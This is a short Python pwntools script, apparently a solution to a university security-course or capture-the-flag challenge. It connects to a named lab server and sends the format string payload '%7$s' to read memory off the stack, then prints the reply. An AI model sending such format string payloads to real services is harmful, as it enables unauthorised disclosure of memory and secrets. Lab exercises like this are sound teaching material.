from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23192

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b"%7$s")
response = s.recvline()
print(response.decode())
